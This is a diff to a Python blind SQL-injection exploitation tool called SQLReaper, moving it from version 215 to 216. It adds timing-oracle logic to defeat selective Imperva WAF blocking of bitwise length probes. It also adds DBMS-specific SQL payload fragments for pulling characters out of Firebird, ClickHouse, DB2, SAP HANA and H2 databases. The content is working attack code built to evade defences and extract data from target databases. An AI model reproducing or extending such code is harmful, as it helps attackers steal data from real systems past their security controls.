@@ -1,10 +1,53 @@
 #!/usr/bin/env python3
 r"""
 ╔════════════════════════════════════════════════════════════════════════════════════╗
-║  SQLReaper v215 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 13, 2026)         ║
-║  v214 base + 7 additional bugs fixed (deep audit of PCV, S-technique, race       ║
-║  conditions, and benign-oracle correctness). v215 adds 3 more root-cause fixes   ║
-║  targeting the silent-WAF FP cycle, RC-2 blind spot, and Imperva minority vote.  ║
+║  SQLReaper v216 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 13, 2026)         ║
+║  v215 base + 1 additional bug fixed (timing oracle RC-2 detection in             ║
+║  _get_length_bitwise). v216 fixes the length-underestimation bug for strings    ║
+║  where the true length has bits 3 or 7 set (lengths 8-15, 24-31, 40-47, etc.)  ║
+║  when a timing oracle is used with Imperva WAF present.                          ║
+║                                                                                    ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║  FRESH EXAMINATION AUDIT (v215 → v216) — 2 BUGS FIXED                           ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║                                                                                    ║
+║  [✓] BUG-V216-TIMING-ORACLE-RC2: _get_length_bitwise RC-2 cross-complementary  ║
+║      sanity check fails for timing oracle. For boolean oracle: WAF blocking →   ║
+║      HTTP 400 → oracle returns True → both-True condition fires RC-2 detection. ║
+║      For timing oracle: WAF blocking → HTTP 400 fast (no sleep) → ms < _thresh  ║
+║      → _eval returns False. Neither boolean-oracle RC-2 condition (both-True or  ║
+║      a=None b=True) ever fires for timing oracle, leaving hex-8 mask bits        ║
+║      (mask=8, mask=128 in 10-bit extraction) undetected as WAF-blocked.         ║
+║      Impact: When real string length has bit 3 or bit 7 set (lengths 8-15,      ║
+║      24-31, 40-47, 128-143, etc.), bitwise length detection underestimates the  ║
+║      length by 8, 128, or 136 → extraction terminates early → truncated results  ║
+║      (e.g. database name "jacbblCl..." extracts as 8 chars instead of 48);      ║
+║      CRITICAL; _get_length_bitwise; timing oracle; all DBMSes; Imperva WAF.     ║
+║      Root cause: The cross-complementary RC-2 detection relies on WAF blocking  ║
+║      returning True (boolean-oracle behaviour), but timing-oracle WAF blocking  ║
+║      returns False (fast response, threshold not met). Two new detection paths:  ║
+║      (1) For timing oracle: if both r_a and r_b are False, exactly one of the   ║
+║          complementary pair MUST fire the sleep for any real integer length.     ║
+║          Both-False means: WAF blocked &8=8 AND bit IS set (sleep suppressed),  ║
+║          OR oracle is completely dead. Either case → equality recovery required. ║
+║      (2) Pre-emptive for timing oracle + _IMPERVA_MINORITY_ACTIVE: when Imperva ║
+║          ML vote is confirmed and timing oracle is active, the both-False case   ║
+║          is invisible when bit 3 is NOT set (r_a correctly False, r_b correctly  ║
+║          True — no anomaly detectable). The minority ML vote is strong prior →  ║
+║          skip hex-8 bitwise length probes and use equality recovery directly.   ║
+║      Fix: extend _len_waf_detected with timing-oracle-specific conditions.       ║
+║                                                                                    ║
+║  [✓] BUG-V216-FALLBACK-EQ-FIREBIRD-CLICKHOUSE-DB2: _fallback_equality char-     ║
+║      extraction dict missing explicit entries for Firebird, ClickHouse, DB2,     ║
+║      SAP_HANA, and H2. All five fell through to the generic default              ║
+║      ASCII(SUBSTRING(q,p,1)), which is a Firebird syntax error (Firebird uses    ║
+║      ASCII_VAL() and SUBSTRING(expr FROM start FOR length) syntax) → every       ║
+║      equality fallback probe raises a DB exception → _eval returns None →        ║
+║      oracle dead → _fallback_equality returns None for all positions → all       ║
+║      characters extracted as None → extraction aborts. ClickHouse requires       ║
+║      lowercase ascii()/substring(); DB2 requires SUBSTR() not SUBSTRING();       ║
+║      MEDIUM; _fallback_equality; Firebird/ClickHouse/DB2/SAP_HANA/H2 only.      ║
+║      Fix: add explicit DBMS-correct entries for each missing DBMS.               ║
 ║                                                                                    ║
 ║  ══════════════════════════════════════════════════════════════════════════════ ║
 ║  FRESH EXAMINATION AUDIT (v214.1 → v215) — 3 BUGS FIXED                         ║
@@ -60051,27 +60094,72 @@ class Scanner:
                 _len_san_r_a = await _eval(_len_san_cond_a)
                 _len_san_r_b = await _eval(_len_san_cond_b)
                 # Cross-complementary pair evaluation:
-                # Both True  → SQL-impossible → WAF selective blocking on &8=8 pattern
-                # a=None, b=True → &8=8 ambiguous/blocked, &8=0 unblocked → WAF selective
-                # a=True, b=False → real bit 3 set in length (not WAF)
-                # a=False, b=True → real bit 3 clear (not WAF)
-                # a=False, b=False → oracle broken
-                # a=None, b=None  → both probes ambiguous → conservative: treat as blocked
+                #
+                # Boolean oracle (_boolean_oracle=True): WAF blocking → HTTP 400/403 →
+                #   oracle reads 400 as True signal:
+                #   Both True  → SQL-impossible → WAF selective blocking on &8=8 pattern
+                #   a=None, b=True → &8=8 ambiguous/blocked, &8=0 unblocked → WAF selective
+                #   a=True, b=False → real bit 3 set in length (not WAF)
+                #   a=False, b=True → real bit 3 clear (not WAF)
+                #   a=False, b=False → oracle broken
+                #   a=None, b=None  → both probes ambiguous → conservative: treat as blocked
+                #
+                # Timing oracle (_boolean_oracle=False): WAF blocking → HTTP 400 fast (no
+                #   sleep) → ms < _thresh → _eval returns False (not True). The boolean-oracle
+                #   RC-2 conditions (both True, a=None b=True) NEVER fire for timing oracle.
+                #   For timing oracle exactly one of the complementary pair MUST fire the sleep
+                #   (exactly one SQL condition is True for any integer length):
+                #   a=True, b=False → bit 3 set (WAF not blocking or blocking &8=0 instead)
+                #   a=False, b=True → bit 3 clear (correct; WAF blocking &8=8 doesn't affect
+                #                     this case — &8=8 is SQL-False when bit=0, WAF-False looks same)
+                #   a=False, b=False → BOTH returned no-sleep: either WAF blocked &8=8 AND
+                #                      bit 3 IS set (WAF made r_a=False when SQL-True), OR
+                #                      oracle is completely broken (no sleep fires at all).
+                #                      In either case, hex-8 mask is unreliable → use equality.
+                #   a=True, b=True → IMPOSSIBLE for timing oracle (same as boolean: detected)
+                #
+                # BUG-V216-TIMING-ORACLE-RC2-FIX: For timing oracle, WAF blocking of &8=8
+                # returns False (fast response, no sleep) which is indistinguishable from
+                # "SQL condition is False" — existing boolean-oracle detection conditions
+                # (both-True, a=None-b=True) never fire. Add two timing-oracle-specific
+                # detection conditions to complete the RC-2 guard for all oracle types:
+                # (1) Both False for timing oracle: WAF blocking of &8=8 when bit IS set
+                #     causes r_a=False (WAF suppressed the sleep) and r_b=False (SQL correct:
+                #     &8=0 is False when bit IS set). BOTH fast → WAF detected OR oracle dead.
+                # (2) Pre-emptive for timing oracle + Imperva minority vote: Imperva is ML-
+                #     confirmed present but timing oracle makes the both-False case invisible
+                #     when bit 3 is NOT set (r_a=False correct, r_b=True correct — no anomaly
+                #     to detect). The minority vote is a strong prior → skip hex-8 bitwise
+                #     probes immediately and use WAF-safe equality recovery for those bits.
                 _len_waf_detected = (
-                    (_len_san_r_a is True and _len_san_r_b is True) or   # impossible → WAF
-                    (_len_san_r_a is None and _len_san_r_b is True)       # &8=8 blocked
+                    (_len_san_r_a is True and _len_san_r_b is True) or      # boolean: impossible → WAF
+                    (_len_san_r_a is None and _len_san_r_b is True) or      # boolean: &8=8 blocked → None
+                    (not _boolean_oracle and                                  # timing oracle:
+                     _len_san_r_a is False and _len_san_r_b is False) or    #   both fast → WAF w/ bit set, or oracle dead
+                    (not _boolean_oracle and _IMPERVA_MINORITY_ACTIVE)       # timing oracle + Imperva confirmed: pre-emptive
                 )
                 if _len_waf_detected:
                     _len_waf_blocked_hex8 = True
                     _len_blocked_masks_set = {m for b in range(max_bits)
                                               for m in [1 << b]
                                               if any(c in hex(m) for c in ('8',))}
+                    _len_detect_reason = (
+                        "timing-oracle+Imperva pre-emptive (minority ML vote)"
+                        if (not _boolean_oracle and _IMPERVA_MINORITY_ACTIVE
+                            and not (_len_san_r_a is False and _len_san_r_b is False))
+                        else "timing-oracle both-False (WAF suppressed sleep on &8=8, or oracle dead)"
+                        if (not _boolean_oracle and _len_san_r_a is False and _len_san_r_b is False)
+                        else "boolean-oracle SQL-impossible (both True)"
+                        if (_len_san_r_a is True and _len_san_r_b is True)
+                        else "boolean-oracle &8=8 blocked (a=None, b=True)"
+                    )
                     LOG.warning("[Inference] _get_length_bitwise: RC-2 cross-complementary "
                                 "sanity detected selective hex-'8' mask WAF blocking "
-                                "(a=%s, b=%s → SQL-impossible at real length position). "
+                                "(a=%s, b=%s, boolean_oracle=%s, reason=%s). "
                                 "Blocked masks for %d-bit extraction: %s. "
                                 "Will recover blocked bits via equality probes.",
-                                _len_san_r_a, _len_san_r_b,
+                                _len_san_r_a, _len_san_r_b, _boolean_oracle,
+                                _len_detect_reason,
                                 max_bits, sorted(_len_blocked_masks_set))
                 elif _len_san_r_a is None and _len_san_r_b is None:
                     # Both probes ambiguous — conservative: treat hex-8 masks as potentially blocked
@@ -62725,7 +62813,23 @@ class Scanner:
                         "THEN TO_NUMBER(SUBSTR(ASCIISTR(c__),2,4),'XXXX') "
                         f"ELSE 0 END FROM (SELECT SUBSTR(({q}),{p},1) c__ FROM DUAL))"
                     ),
-                    "SQLite":      f"COALESCE(UNICODE(SUBSTR(({q}),{p},1)),0)"  # BUG-9 FIX,
+                    "SQLite":      f"COALESCE(UNICODE(SUBSTR(({q}),{p},1)),0)",  # BUG-9 FIX
+                    # BUG-FALLBACK-EQ-FIREBIRD FIX: Firebird uses ASCII_VAL() (not ASCII()) and
+                    # SUBSTRING(expr FROM start FOR length) syntax (not SUBSTRING(expr,start,len)).
+                    # The generic fallback ASCII(SUBSTRING(...,p,1)) is a Firebird syntax error →
+                    # every equality probe raises an exception → _eval returns None → oracle dead.
+                    "Firebird":    f"COALESCE(ASCII_VAL(SUBSTRING(({q}) FROM {p} FOR 1)),0)",
+                    # BUG-FALLBACK-EQ-CLICKHOUSE FIX: ClickHouse requires lowercase function names
+                    # and uses substring(str, start, len) or substr(). ascii() returns 0 for multi-
+                    # byte chars but is correct for ASCII-range values in DB identifiers.
+                    "ClickHouse":  f"ascii(substring(({q}),{p},1))",
+                    # BUG-FALLBACK-EQ-DB2 FIX: DB2 uses ASCII() but requires SUBSTR() (not
+                    # SUBSTRING()) for character extraction. COALESCE handles NULL at end-of-string.
+                    "DB2":         f"COALESCE(ASCII(SUBSTR(({q}),{p},1)),0)",
+                    # BUG-FALLBACK-EQ-SAP-H2 FIX: SAP HANA and H2 support standard ASCII(SUBSTR()).
+                    # Explicit entries avoid the generic SUBSTRING fallback which may differ.
+                    "SAP_HANA":    f"ASCII(SUBSTR(({q}),{p},1))",
+                    "H2":          f"ASCII(SUBSTR(({q}),{p},1))",
                 }.get(_dbms, f"ASCII(SUBSTRING(({q}),{p},1))")
                 # Probe common ranges first to minimise requests in the typical case
                 # FIX-FALLBACK-EQUALITY: extend charset to 32-255.
